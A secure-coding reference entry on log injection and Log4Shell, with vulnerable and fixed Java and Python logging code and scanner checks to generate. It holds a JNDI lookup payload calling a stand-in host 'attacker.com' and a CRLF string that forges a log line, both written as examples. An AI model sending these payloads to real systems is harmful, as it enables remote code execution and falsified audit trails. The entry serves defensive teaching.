---
id: injection-log
title: Log Injection (Log Forging) and Log4Shell
severity: high
tags: [injection, log-injection, log4shell, log4j, crlf]
taxonomy: security/injection/log
references:
  - https://owasp.org/www-community/attacks/Log_Injection
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
---

# Log Injection (Log Forging) and Log4Shell

## Description

Log injection occurs when unvalidated user input is written to log files, allowing attackers to forge log entries, inject CRLF sequences to split log lines, or exploit log parsers. Log4Shell (CVE-2021-44228) is the most devastating example: Log4j2 evaluated JNDI lookups in logged strings, enabling RCE via `${jndi:ldap://attacker.com/a}`.

## Vulnerable Pattern

```java
// BAD — Log4j2 logging user input (Log4Shell)
import org.apache.logging.log4j.LogManager;
Logger logger = LogManager.getLogger();

String userAgent = request.getHeader("User-Agent");
logger.info("Request from: " + userAgent);
// Payload: User-Agent: ${jndi:ldap://attacker.com/RCE}
// → Log4j2 evaluates JNDI lookup → loads remote class → RCE
```

```python
# BAD — CRLF injection in log file
username = request.form.get("username")
logger.info(f"Login attempt for: {username}")
# Payload: "admin\n2024-01-01 WARN Successful login for: attacker"
# → forged log entry injected
```

## Secure Pattern

```java
// GOOD — Log4j2: upgrade to >= 2.17.1 AND disable JNDI lookups
// In log4j2.properties:
// log4j2.formatMsgNoLookups=true
// Or set system property: -Dlog4j2.formatMsgNoLookups=true

// GOOD — sanitize user input before logging
String safeUserAgent = userAgent.replaceAll("[\r\n\t]", "_");
logger.info("Request from: {}", safeUserAgent);  // use parameterized logging
```

```python
# GOOD — strip CRLF before logging
import re
def sanitize_for_log(value: str) -> str:
    return re.sub(r"[\r\n\t]", "_", value)

logger.info("Login attempt for: %s", sanitize_for_log(username))
```

## Checks to Generate

- Grep for `log4j` version `< 2.17.1` in `pom.xml`, `build.gradle`, `*.jar` manifests.
- Flag `logger.info(` / `log.warn(` where user-supplied strings are concatenated (not parameterized).
- Grep for logging of `User-Agent`, `Referer`, `X-Forwarded-For` headers without sanitization.
- Flag `logger.*(f"` or `log.*(f"` — f-strings in logging calls with user data.
- Check for CRLF in logged values — strip `\r\n` from all user-supplied log data.
